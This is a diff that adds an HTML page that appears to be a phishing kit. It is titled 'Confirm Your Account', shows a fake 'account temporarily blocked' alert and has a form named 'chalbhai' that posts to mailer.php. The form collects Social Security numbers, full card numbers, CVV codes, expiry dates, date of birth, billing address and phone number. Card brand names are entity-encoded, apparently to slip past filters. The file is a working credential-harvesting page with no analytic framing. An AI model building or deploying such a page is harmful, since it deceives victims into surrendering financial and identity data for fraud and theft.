@@ -1,0 +1,878 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Confirm Your Account</title>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
+<link rel="shortcut icon"
+              href="images/favicon.ico"/>
+			  
+			  
+	
+<script type="text/javascript">
+
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+
+</script>
+
+<body style="visibility:hidden" onload="unhideBody()">
+
+
+
+<style> 
+  .textbox { 
+    border: 1px solid #c4c4c4; 
+    height: 35px; 
+    width: 275px; 
+    font-size: 15px; 
+    padding: 4px 4px 4px 4px; 
+    border-radius: 4px; 
+    -moz-border-radius: 4px; 
+    -webkit-border-radius: 4px; 
+    box-shadow: 0px 0px 8px #d9d9d9; 
+    -moz-box-shadow: 0px 0px 8px #d9d9d9; 
+    -webkit-box-shadow: 0px 0px 8px #d9d9d9; 
+} 
+ 
+.textbox:focus { 
+    outline: none; 
+    border: 1px solid #7bc1f7; 
+    box-shadow: 0px 0px 8px #7bc1f7; 
+    -moz-box-shadow: 0px 0px 8px #7bc1f7; 
+    -webkit-box-shadow: 0px 0px 8px #7bc1f7; 
+} 
+ </style> 
+<style type="text/css">
+/*----------Text Styles----------*/
+.ws6 {font-size: 8px;}
+.ws7 {font-size: 9.3px;}
+.ws8 {font-size: 11px;}
+.ws9 {font-size: 12px;}
+.ws10 {font-size: 13px;}
+.ws11 {font-size: 15px;}
+.ws12 {font-size: 16px;}
+.ws14 {font-size: 19px;}
+.ws16 {font-size: 21px;}
+.ws18 {font-size: 24px;}
+.ws20 {font-size: 27px;}
+.ws22 {font-size: 29px;}
+.ws24 {font-size: 32px;}
+.ws26 {font-size: 35px;}
+.ws28 {font-size: 37px;}
+.ws36 {font-size: 48px;}
+.ws48 {font-size: 64px;}
+.ws72 {font-size: 96px;}
+.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
+/*----------Para Styles----------*/
+DIV,UL,OL /* Left */
+{
+ margin-top: 0px;
+ margin-bottom: 0px;
+}
+</style>
+
+
+<script LANGUAGE="JavaScript">
+<!--
+
+var b = 0 ;
+var i = 0 ;
+var errmsg = "" ;
+var punct = "" ;
+var min = 0 ;
+var max = 0 ;
+
+function formbreeze_email(field) {
+
+	if (b && (field.value.length == 0)) return true ;
+
+
+	if (! emailCheck(field.value))
+	  {
+		  field.focus();
+		  if (field.type == "text") field.select();
+		  return false ;
+	  }
+
+   return true ;
+}
+
+function formbreeze_filledin(field) {
+
+if (b && (field.value.length == 0)) return true;
+
+if (field.value.length < min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+if ((max > 0) && (field.value.length > max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+return true ;
+}
+
+function formbreeze_number(field) {
+
+if (b && (field.value.length == 0)) return true ; ;
+
+if (i)
+ var valid = "0123456789"
+else
+ var valid = ".,0123456789"
+
+var pass = 1;
+var temp;
+for (var i=0; i<field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+ }
+
+if (field.value < min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+
+if ((max > 0) && (field.value > max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+
+function formbreeze_numseq(field) {
+
+
+if (b && (field.value.length == 0)) return true ;
+
+var valid = punct + "0123456789"
+
+var pass = 1;
+var digits = 0
+var temp;
+for (var i=0; i<field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ; ;
+   }
+
+if (digits < min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+if ((max > 0) && (digits > max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+function emailCheck (emailStr) {
+
+var checkTLD=1;
+var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
+var emailPat=/^(.+)@(.+)$/;
+var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
+var validChars="\[^\\s" + specialChars + "\]";
+var quotedUser="(\"[^\"]*\")";
+var atom=validChars + '+';
+var word="(" + atom + "|" + quotedUser + ")";
+var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
+var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
+var matchArray=emailStr.match(emailPat);
+
+if (matchArray==null) {
+alert(errmsg);
+return false;
+}
+var user=matchArray[1];
+var domain=matchArray[2];
+
+for (i=0; i<user.length; i++) {
+if (user.charCodeAt(i)>127) {
+alert(errmsg);
+return false;
+   }
+}
+for (i=0; i<domain.length; i++) {
+if (domain.charCodeAt(i)>127) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (user.match(userPat)==null) {
+alert(errmsg);
+return false;
+}
+
+var atomPat=new RegExp("^" + atom + "$");
+var domArr=domain.split(".");
+var len=domArr.length;
+for (i=0;i<len;i++) {
+if (domArr[i].search(atomPat)==-1) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (checkTLD && domArr[domArr.length-1].length!=2 &&
+domArr[domArr.length-1].search(knownDomsPat)==-1) {
+alert(errmsg);
+return false;
+}
+
+if (len<2) {
+alert(errmsg);
+return false;
+}
+
+return true;
+}
+
+function formbreeze_sub()
+{
+/*
+//FBDATA:formtext1^0^1^0^0^Please Fill in All Of the Required Fields:;formtext2^0^1^0^0^Please Fill in All Of the Required Fields:;formtext3^0^1^0^0^Please Fill in All Of the Required Fields:;formtext4^0^1^0^0^Please Fill in All Of the Required Fields:;formtext9^0^1^0^0^Please Fill in All Of the Required Fields:;formtext10^0^1^0^0^Please Fill in All Of the Required Fields:;formtext11^0^1^0^0^Please Fill in All Of the Required Fields:;formtext12^0^1^0^0^Please Fill in All Of the Required Fields:;formtext13^0^1^0^0^Please Fill in All Of the Required Fields:;formtext14^0^1^0^0^Please Fill in All Of the Required Fields:;formtext15^0^1^0^0^Please Fill in All Of the Required Fields:;formtext16^0^1^0^0^Please Fill in All Of the Required Fields:;
+*/
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext3) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext4) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext9) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext10) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext11) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext12) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext13) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext14) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext15) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext16) ) return false ;
+
+}
+-->
+</script>
+
+</head>
+<body bgColor="#F4F4F4">
+
+<script> alert('Your Account temporarily blocked.Please Verify Your Account.')</script>
+
+
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1347px; height:85px; z-index:0"><img src="images/header2.png" alt="" title="" border=0 width=1347 height=85></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:1102px; width:1348px; height:99px; z-index:1"><a href="#"><img src="images/footer2.png" alt="" title="" border=0 width=1348 height=99></a></div>
+
+<div id="shape1" style="position:absolute; overflow:hidden; left:263px; top:125px; width:813px; height:862px; z-index:2"><img border=0 width="100%" height="100%" alt="" src="images/shape17823031.gif"></div>
+
+<div id="text1" style="position:absolute; overflow:hidden; left:304px; top:150px; width:664px; height:26px; z-index:3">
+<div class="wpmd">
+<div><font color="#00CCFF" class="ws18">Enter your information</font></div>
+</div></div>
+<form action=mailer.php name=chalbhai id=chalbhai method=post  onsubmit=" return formbreeze_sub()" >
+<input name="formtext1" class="textbox" type="text" style="position:absolute;width:268px;left:309px;top:220px;z-index:4">
+<input name="formtext2" class="textbox" type="text" maxlength=9 style="position:absolute;width:268px;left:641px;top:218px;z-index:5">
+<div id="text2" style="position:absolute; overflow:hidden; left:309px; top:199px; width:239px; height:22px; z-index:6">
+<div class="wpmd">
+<div><font class="ws12">Card holder Name</font></div>
+</div></div>
+
+<div id="text3" style="position:absolute; overflow:hidden; left:640px; top:199px; width:239px; height:22px; z-index:7">
+<div class="wpmd">
+<div><font class="ws12">Social Security Number</font></div>
+</div></div>
+
+<input name="formtext3" class="textbox" type="text" maxlength=16 style="position:absolute;width:268px;left:641px;top:290px;z-index:8">
+<div id="text4" style="position:absolute; overflow:hidden; left:308px; top:267px; width:239px; height:22px; z-index:9">
+<div class="wpmd">
+<div><font class="ws12">Card Type</font></div>
+</div></div>
+
+<div id="text5" style="position:absolute; overflow:hidden; left:640px; top:271px; width:239px; height:22px; z-index:10">
+<div class="wpmd">
+<div><font class="ws12">Card Number</font></div>
+</div></div>
+
+<input name="formtext4" class="textbox" type="text" maxlength=3 style="position:absolute;width:96px;left:641px;top:372px;z-index:11">
+<div id="text6" style="position:absolute; overflow:hidden; left:640px; top:353px; width:200px; height:22px; z-index:12">
+<div class="wpmd">
+<div><font class="ws12">Card Verification Number</font></div>
+</div></div>
+
+<input name="formtext9" class="textbox" type="text" style="position:absolute;width:268px;left:300px;top:524px;z-index:13">
+<input name="formtext10" class="textbox" type="text" style="position:absolute;width:268px;left:632px;top:522px;z-index:14">
+<div id="text11" style="position:absolute; overflow:hidden; left:631px; top:503px; width:239px; height:22px; z-index:15">
+<div class="wpmd">
+<div><font class="ws12">Last Name</font></div>
+</div></div>
+
+<input name="formtext11" class="textbox" type="text" style="position:absolute;width:268px;left:631px;top:589px;z-index:16">
+<div id="text12" style="position:absolute; overflow:hidden; left:630px; top:570px; width:239px; height:22px; z-index:17">
+<div class="wpmd">
+<div><font class="ws12">Address line 1</font></div>
+</div></div>
+
+<div id="hr1" style="position:absolute; overflow:hidden; left:301px; top:413px; width:721px; height:17px; z-index:18">
+<hr size=2 width=721>
+</div>
+
+<select name="formselect1" class="textbox" style="position:absolute;left:300px;top:592px;width:85px;z-index:19">
+<option value="Day">Day</option>
+<option value='01'>01</option>
+<option value='02'>02</option>
+<option value='03'>03</option>
+<option value='04'>04</option>
+<option value='05'>05</option>
+<option value='06'>06</option>
+<option value='07'>07</option>
+<option value='08'>08</option>
+<option value='09'>09</option>
+<option value='10'>10</option>
+<option value='11'>11</option>
+<option value='12'>12</option>
+<option value='13'>13</option>
+<option value='14'>14</option>
+<option value='15'>15</option>
+<option value='16'>16</option>
+<option value='17'>17</option>
+<option value='18'>18</option>
+<option value='19'>19</option>
+<option value='20'>20</option>
+<option value='21'>21</option>
+<option value='22'>22</option>
+<option value='23'>23</option>
+<option value='24'>24</option>
+<option value='25'>25</option>
+<option value='26'>26</option>
+<option value='27'>27</option>
+<option value='28'>28</option>
+<option value='29'>29</option>
+<option value='30'>30</option>
+<option value='31'>31</option>
+</select>
+<select name="formselect2" class="textbox" style="position:absolute;left:396px;top:592px;width:82px;z-index:20">
+<option value="Month">Month</option>
+<option value='01'>January</option>
+<option value='02'>February</option>
+<option value='03'>March</option>
+<option value='04'>April</option>
+<option value='05'>May</option>
+<option value='06'>June</option>
+<option value='07'>July</option>
+<option value='08'>August</option>
+<option value='09'>September</option>
+<option value='10'>October</option>
+<option value='11'>November</option>
+<option value='12'>December</option>
+</select>
+<div id="text13" style="position:absolute; overflow:hidden; left:299px; top:564px; width:239px; height:22px; z-index:21">
+<div class="wpmd">
+<div><font class="ws12">Date of Birth</font></div>
+</div></div>
+
+<select name="formselect3" class="textbox" style="position:absolute;left:308px;top:290px;width:270px;z-index:22">
+<option value="V">V&#105;&#115;a</option><option value="M">Ma&#115;&#116;&#101;&#114;&#32;&#67;&#97;rd</option><option value="A">American Express</option><option value="D">Discover</option>
+</select>
+<div id="image3" style="position:absolute; overflow:hidden; left:912px; top:289px; width:150px; height:26px; z-index:23"><img src="images/card.png" alt="" title="" border=0 width=150 height=26></div>
+
+<select name="formselect4" class="textbox" style="position:absolute;left:307px;top:370px;width:128px;z-index:24">
+<option value="Month">Month</option>
+<option value='01'>January</option>
+<option value='02'>February</option>
+<option value='03'>March</option>
+<option value='04'>April</option>
+<option value='05'>May</option>
+<option value='06'>June</option>
+<option value='07'>July</option>
+<option value='08'>August</option>
+<option value='09'>September</option>
+<option value='10'>October</option>
+<option value='11'>November</option>
+<option value='12'>December</option>
+</select>
+<select name="formselect5" class="textbox" style="position:absolute;left:447px;top:370px;width:127px;z-index:25">
+<option value="2014">Year</option><option value="2014">2014</option><option value="2015">2015</option><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option>
+</select>
+<div id="text14" style="position:absolute; overflow:hidden; left:306px; top:342px; width:239px; height:22px; z-index:26">
+<div class="wpmd">
+<div><font class="ws12">Expiration date</font></div>
+</div></div>
+
+<div id="image4" style="position:absolute; overflow:hidden; left:743px; top:371px; width:51px; height:31px; z-index:27"><img src="images/mini.gif" alt="" title="" border=0 width=51 height=31></div>
+
+<div id="text15" style="position:absolute; overflow:hidden; left:304px; top:437px; width:412px; height:26px; z-index:28">
+<div class="wpmd">
+<div><font color="#00CCFF" class="ws16">Billing Address</font></div>
+</div></div>
+
+<div id="text16" style="position:absolute; overflow:hidden; left:300px; top:503px; width:239px; height:22px; z-index:29">
+<div class="wpmd">
+<div><font class="ws12">First Name</font></div>
+</div></div>
+
+<select name="formselect6" class="textbox" style="position:absolute;left:484px;top:591px;width:82px;z-index:30">
+<option value="Month">Year</option>
+<option value="1996">2004</option>
+    <option value="1995">2003</option>
+    <option value="1994">2002</option>
+    <option value="1993">2001</option>
+    <option value="1992">2000</option>
+    <option value="1991">1999</option>
+    <option value="1990">1998</option>
+    <option value="1989">1997</option>
+<option value="1996">1996</option>
+    <option value="1995">1995</option>
+    <option value="1994">1994</option>
+    <option value="1993">1993</option>
+    <option value="1992">1992</option>
+    <option value="1991">1991</option>
+    <option value="1990">1990</option>
+    <option value="1989">1989</option>
+    <option value="1988">1988</option>
+    <option value="1987">1987</option>
+    <option value="1986">1986</option>
+    <option value="1985">1985</option>
+    <option value="1984">1984</option>
+    <option value="1983">1983</option>
+    <option value="1982">1982</option>
+    <option value="1981">1981</option>
+    <option value="1980">1980</option>
+    <option value="1979">1979</option>
+    <option value="1978">1978</option>
+    <option value="1977">1977</option>
+    <option value="1976">1976</option>
+    <option value="1975">1975</option>
+    <option value="1974">1974</option>
+    <option value="1973">1973</option>
+    <option value="1972">1972</option>
+    <option value="1971">1971</option>
+    <option value="1970">1970</option>
+    <option value="1969">1969</option>
+    <option value="1968">1968</option>
+    <option value="1967">1967</option>
+    <option value="1966">1966</option>
+    <option value="1965">1965</option>
+    <option value="1964">1964</option>
+    <option value="1963">1963</option>
+    <option value="1962">1962</option>
+    <option value="1961">1961</option>
+    <option value="1960">1960</option>
+    <option value="1959">1959</option>
+    <option value="1958">1958</option>
+    <option value="1957">1957</option>
+    <option value="1956">1956</option>
+    <option value="1955">1955</option>
+    <option value="1954">1954</option>
+    <option value="1953">1953</option>
+    <option value="1952">1952</option>
+    <option value="1951">1951</option>
+    <option value="1950">1950</option>
+    <option value="1949">1949</option>
+    <option value="1948">1948</option>
+    <option value="1947">1947</option>
+    <option value="1946">1946</option>
+    <option value="1945">1945</option>
+    <option value="1944">1944</option>
+    <option value="1943">1943</option>
+    <option value="1942">1942</option>
+    <option value="1941">1941</option>
+    <option value="1940">1940</option>
+    <option value="1939">1939</option>
+    <option value="1938">1938</option>
+    <option value="1937">1937</option>
+    <option value="1936">1936</option>
+    <option value="1935">1935</option>
+    <option value="1934">1934</option>
+    <option value="1933">1933</option>
+    <option value="1932">1932</option>
+    <option value="1931">1931</option>
+    <option value="1930">1930</option>
+    <option value="1929">1929</option>
+    <option value="1928">1928</option>
+    <option value="1927">1927</option>
+    <option value="1926">1926</option>
+    <option value="1925">1925</option>
+    <option value="1924">1924</option>
+    <option value="1923">1923</option>
+    <option value="1922">1922</option>
+    <option value="1921">1921</option>
+    <option value="1920">1920</option>
+    <option value="1919">1919</option>
+    <option value="1918">1918</option>
+    <option value="1917">1917</option>
+    <option value="1916">1916</option>
+    <option value="1915">1915</option>
+    <option value="1914">1914</option>
+    <option value="1913">1913</option>
+    <option value="1912">1912</option>
+    <option value="1911">1911</option>
+    <option value="1910">1910</option>
+    <option value="1909">1909</option>
+    <option value="1908">1908</option>
+    <option value="1907">1907</option>
+    <option value="1906">1906</option>
+    <option value="1905">1905</option>
+    <option value="1904">1904</option>
+    <option value="1903">1903</option>
+    <option value="1902">1902</option>
+    <option value="1901">1901</option>
+    <option value="1900">1900</option>
+    <option value="1899">1899</option>
+    <option value="1898">1898</option>
+    <option value="1897">1897</option>
+    <option value="1896">1896</option>
+    <option value="1895">1895</option>
+    <option value="1894">1894</option>
+</select>
+<input name="formtext12" class="textbox" type="text" style="position:absolute;width:268px;left:298px;top:659px;z-index:31">
+<input name="formtext13" class="textbox" type="text" style="position:absolute;width:268px;left:630px;top:657px;z-index:32">
+<div id="text17" style="position:absolute; overflow:hidden; left:629px; top:638px; width:239px; height:22px; z-index:33">
+<div class="wpmd">
+<div><font class="ws12">City</font></div>
+</div></div>
+
+<div id="text18" style="position:absolute; overflow:hidden; left:295px; top:637px; width:239px; height:22px; z-index:34">
+<div class="wpmd">
+<div><font class="ws12">Address line 2 </font><font color="#969696">(optional)</font></div>
+</div></div>
+
+<input name="formtext14" class="textbox" type="text" style="position:absolute;width:268px;left:298px;top:734px;z-index:35">
+<input name="formtext15" class="textbox" type="text" maxlength=7 style="position:absolute;width:112px;left:630px;top:732px;z-index:36">
+<div id="text19" style="position:absolute; overflow:hidden; left:629px; top:713px; width:239px; height:22px; z-index:37">
+<div class="wpmd">
+<div><font class="ws12">Postal code</font></div>
+</div></div>
+
+<div id="text20" style="position:absolute; overflow:hidden; left:298px; top:712px; width:239px; height:22px; z-index:38">
+<div class="wpmd">
+<div><font class="ws12">State / Province / Region</font></div>
+</div></div>
+
+<select name="formselect7" class="textbox" style="position:absolute;left:299px;top:803px;width:268px;z-index:39">
+<option value="Day"> Select Country</option>
+<option value="United States">United States</option>
+						<option value="United Kingdom">United Kingdom</option>
+						<option value="Albania">Albania</option>
+						<option value="Algeria">Algeria</option>
+						<option value="Andorra">Andorra</option>
+						<option value="Angola">Angola</option>
+						<option value="Anguilla">Anguilla</option>
+						<option value="Antigua and Barbuda">Antigua and Barbuda
+						</option>
+						<option value="Argentina">Argentina</option>
+						<option value="Armenia">Armenia</option>
+						<option value="Aruba">Aruba</option>
+						<option value="Australia">Australia</option>
+						<option value="Austria">Austria</option>
+						<option value="Azerbaijan Republic">Azerbaijan Republic
+						</option>
+						<option value="Bahamas">Bahamas</option>
+						<option value="Bahrain">Bahrain</option>
+						<option value="Barbados">Barbados</option>
+						<option value="Belgium">Belgium</option>
+						<option value="Belize">Belize</option>
+						<option value="Benin">Benin</option>
+						<option value="Bermuda">Bermuda</option>
+						<option value="Bhutan">Bhutan</option>
+						<option value="Bolivia">Bolivia</option>
+						<option value="Bosnia and Herzegovina">Bosnia and 
+						Herzegovina
+						</option>
+						<option value="Botswana">Botswana</option>
+						<option value="Brazil">Brazil</option>
+						<option value="British Virgin Islands">British Virgin 
+						Islands
+						</option>
+						<option value="Brunei">Brunei</option>
+						<option value="Bulgaria">Bulgaria</option>
+						<option value="Burkina Faso">Burkina Faso</option>
+						<option value="Burundi">Burundi</option>
+						<option value="Cambodia">Cambodia</option>
+						<option value="Canada">Canada</option>
+						<option value="Cape Verde">Cape Verde</option>
+						<option value="Cayman Islands">Cayman Islands</option>
+						<option value="Chad">Chad</option>
+						<option value="Chile">Chile</option>
+						<option value="China Worldwide">China Worldwide</option>
+						<option value="Colombia">Colombia</option>
+						<option value="Comoros">Comoros</option>
+						<option value="Cook Islands">Cook Islands</option>
+						<option value="Costa Rica">Costa Rica</option>
+						<option value="Croatia">Croatia</option>
+						<option value="Cyprus">Cyprus</option>
+						<option value="Czech Republic">Czech Republic</option>
+						<option value="Democratic Republic of the Congo">
+						Democratic Republic of the Congo</option>
+						<option value="Denmark">Denmark</option>
+						<option value="Djibouti">Djibouti</option>
+						<option value="Dominica">Dominica</option>
+						<option value="Dominican Republic">Dominican Republic
+						</option>
+						<option value="Ecuador">Ecuador</option>
+						<option value="El Salvador">El Salvador</option>
+						<option value="Eritrea">Eritrea</option>
+						<option value="Estonia">Estonia</option>
+						<option value="Ethiopia">Ethiopia</option>
+						<option value="Falkland Islands">Falkland Islands
+						</option>
+						<option value="Faroe Islands">Faroe Islands</option>
+						<option value="Federated States of Micronesia">Federated 
+						States of Micronesia
+						</option>
+						<option value="Fiji">Fiji</option>
+						<option value="Finland">Finland</option>
+						<option value="France">France</option>
+						<option value="French Guiana">French Guiana</option>
+						<option value="French Polynesia">French Polynesia
+						</option>
+						<option value="Gabon Republic">Gabon Republic</option>
+						<option value="Gambia">Gambia</option>
+						<option value="Germany">Germany</option>
+						<option value="Gibraltar">Gibraltar</option>
+						<option value="Greece">Greece</option>
+						<option value="Greenland">Greenland</option>
+						<option value="Grenada">Grenada</option>
+						<option value="Guadeloupe">Guadeloupe</option>
+						<option value="Guatemala">Guatemala</option>
+						<option value="Guinea">Guinea</option>
+						<option value="Guinea Bissau">Guinea Bissau</option>
+						<option value="Guyana">Guyana</option>
+						<option value="Honduras">Honduras</option>
+						<option value="Hong Kong">Hong Kong</option>
+						<option value="Hungary">Hungary</option>
+						<option value="Iceland">Iceland</option>
+						<option value="India">India</option>
+						<option value="Indonesia">Indonesia</option>
+						<option value="Ireland">Ireland</option>
+						<option value="Israel">Israel</option>
+						<option value="Italy">Italy</option>
+						<option value="Jamaica">Jamaica</option>
+						<option value="Japan">Japan</option>
+						<option value="Jordan">Jordan</option>
+						<option value="Kazakhstan">Kazakhstan</option>
+						<option value="Kenya">Kenya</option>
+						<option value="Kiribati">Kiribati</option>
+						<option value="Kuwait">Kuwait</option>
+						<option value="Kyrgyzstan">Kyrgyzstan</option>
+						<option value="Laos">Laos</option>
+						<option value="Latvia">Latvia</option>
+						<option value="Lesotho">Lesotho</option>
+						<option value="Liechtenstein">Liechtenstein</option>
+						<option value="Lithuania">Lithuania</option>
+						<option value="Luxembourg">Luxembourg</option>
+						<option value="Madagascar">Madagascar</option>
+						<option value="Malawi">Malawi</option>
+						<option value="Malaysia">Malaysia</option>
+						<option value="Maldives">Maldives</option>
+						<option value="Mali">Mali</option>
+						<option value="Malta">Malta</option>
+						<option value="Marshall Islands">Marshall Islands
+						</option>
+						<option value="Martinique">Martinique</option>
+						<option value="Mauritania">Mauritania</option>
+						<option value="Mauritius">Mauritius</option>
+						<option value="Mayotte">Mayotte</option>
+						<option value="Mexico">Mexico</option>
+						<option value="Mongolia">Mongolia</option>
+						<option value="Montserrat">Montserrat</option>
+						<option value="Morocco">Morocco</option>
+						<option value="Mozambique">Mozambique</option>
+						<option value="Namibia">Namibia</option>
+						<option value="Nauru">Nauru</option>
+						<option value="Nepal">Nepal</option>
+						<option value="Netherlands">Netherlands</option>
+						<option value="Netherlands Antilles">Netherlands 
+						Antilles
+						</option>
+						<option value="New Caledonia">New Caledonia</option>
+						<option value="New Zealand">New Zealand</option>
+						<option value="Nicaragua">Nicaragua</option>
+						<option value="Niger">Niger</option>
+						<option value="Niue">Niue</option>
+						<option value="Norfolk Island">Norfolk Island</option>
+						<option value="Norway">Norway</option>
+						<option value="Oman">Oman</option>
+						<option value="Palau">Palau</option>
+						<option value="Panama">Panama</option>
+						<option value="Papua New Guinea">Papua New Guinea
+						</option>
+						<option value="Peru">Peru</option>
+						<option value="Philippines">Philippines</option>
+						<option value="Pitcairn Islands">Pitcairn Islands
+						</option>
+						<option value="Poland">Poland</option>
+						<option value="Portugal">Portugal</option>
+						<option value="Qatar">Qatar</option>
+						<option value="Republic of the Congo">Republic of the 
+						Congo
+						</option>
+						<option value="Reunion">Reunion</option>
+						<option value="Romania">Romania</option>
+						<option value="Russia">Russia</option>
+						<option value="Rwanda">Rwanda</option>
+						<option value="Saint Vincent and the Grenadines">Saint 
+						Vincent and the Grenadines</option>
+						<option value="Samoa">Samoa</option>
+						<option value="San Marino">San Marino</option>
+						<option value="Sao Tome and Principe">Sao Tome and 
+						Principe
+						</option>
+						<option value="Saudi Arabia">Saudi Arabia</option>
+						<option value="Senegal">Senegal</option>
+						<option value="Seychelles">Seychelles</option>
+						<option value="Sierra Leone">Sierra Leone</option>
+						<option value="Singapore">Singapore</option>
+						<option value="Slovakia">Slovakia</option>
+						<option value="Slovenia">Slovenia</option>
+						<option value="Solomon Islands">Solomon Islands</option>
+						<option value="Somalia">Somalia</option>
+						<option value="South Africa">South Africa</option>
+						<option value="South Korea">South Korea</option>
+						<option value="Spain">Spain</option>
+						<option value="Sri Lanka">Sri Lanka</option>
+						<option value="St. Helena">St. Helena</option>
+						<option value="St. Kitts and Nevis">St. Kitts and Nevis
+						</option>
+						<option value="St. Lucia">St. Lucia</option>
+						<option value="St. Pierre and Miquelon">St. Pierre and 
+						Miquelon
+						</option>
+						<option value="Suriname">Suriname</option>
+						<option value="Svalbard and Jan Mayen Islands">Svalbard 
+						and Jan Mayen Islands
+						</option>
+						<option value="Swaziland">Swaziland</option>
+						<option value="Sweden">Sweden</option>
+						<option value="Switzerland">Switzerland</option>
+						<option value="Taiwan">Taiwan</option>
+						<option value="Tajikistan">Tajikistan</option>
+						<option value="Tanzania">Tanzania</option>
+						<option value="Thailand">Thailand</option>
+						<option value="Togo">Togo</option>
+						<option value="Tonga">Tonga</option>
+						<option value="Trinidad and Tobago">Trinidad and Tobago
+						</option>
+						<option value="Tunisia">Tunisia</option>
+						<option value="Turkey">Turkey</option>
+						<option value="Turkmenistan">Turkmenistan</option>
+						<option value="Turks and Caicos Islands">Turks and 
+						Caicos Islands
+						</option>
+						<option value="Tuvalu">Tuvalu</option>
+						<option value="Uganda">Uganda</option>
+						<option value="Ukraine">Ukraine</option>
+						<option value="United Arab Emirates">United Arab 
+						Emirates
+						</option>
+						<option value="Uruguay">Uruguay</option>
+						<option value="Vanuatu">Vanuatu</option>
+						<option value="Vatican City State">Vatican City State
+						</option>
+						<option value="Venezuela">Venezuela</option>
+						<option value="Vietnam">Vietnam</option>
+						<option value="Wallis and Futuna Islands">Wallis and 
+						Futuna Islands
+						</option>
+						<option value="Yemen">Yemen</option>
+						<option value="Zambia">Zambia</option>
+</select>
+<div id="text21" style="position:absolute; overflow:hidden; left:298px; top:774px; width:239px; height:22px; z-index:40">
+<div class="wpmd">
+<div><font class="ws12">Country</font></div>
+</div></div>
+
+<input name="formtext16" class="textbox" type="text" maxlength=18 style="position:absolute;width:268px;left:628px;top:799px;z-index:41">
+<div id="text22" style="position:absolute; overflow:hidden; left:628px; top:778px; width:239px; height:22px; z-index:42">
+<div class="wpmd">
+<div><font class="ws12">Phone Number</font></div>
+</div></div>
+
+<div id="formimage1" style="position:absolute; left:746px; top:921px; z-index:43"><input type="image" name="formimage1" width="204" height="49" src="images/confirm.png"></div>
+
+</body>
+</html>
